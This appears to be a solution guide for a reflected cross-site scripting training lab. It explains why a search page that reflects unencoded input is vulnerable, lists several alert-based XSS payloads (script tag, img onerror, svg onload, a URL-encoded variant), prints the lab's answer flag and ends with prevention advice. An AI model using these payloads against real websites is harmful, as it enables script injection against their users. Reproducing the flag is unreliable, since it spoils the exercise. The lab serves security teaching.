# Solution Guide: Reflected XSS Lab

## Lab Objective
Perform a cross-site scripting attack that calls the `alert` function.

## Vulnerability Analysis
The search functionality in `search.php` directly reflects the user's search term without any HTML encoding or sanitization. This allows for HTML and JavaScript injection.

## Solution Steps

1. Navigate to the lab in your browser
2. Enter the following payload in the search box:
   ```
   <script>alert('XSS')</script>
   ```
3. Click the search button
4. The JavaScript code will execute and display an alert
5. A flag will appear on the page confirming successful exploitation

## Alternative Solutions

If the `<script>` tag is filtered, you can try:

1. Image tag with onerror event:
   ```
   <img src=x onerror=alert('XSS')>
   ```
   (Note: This needs to be URL encoded when submitted via URL: `%3Cimg%20src=x%20onerror=alert%28%27XSS%27%29%3E`)

2. SVG element with onload event:
   ```
   <svg onload=alert('XSS')>
   ```

3. Using JavaScript event handlers:
   ```
   <div onclick=alert('XSS')>Click me</div>
   ```

## Flag
When you successfully execute an XSS attack, the following flag will appear:
```
Flag: IDS{fdc13e38eb7c4e2bf9f157cab4a4304c}
```

## Prevention

To prevent this vulnerability, the application should:
1. Encode special characters in user input before reflecting them in HTML
2. Implement Content Security Policy (CSP)
3. Validate and sanitize user input
4. Use proper output encoding based on context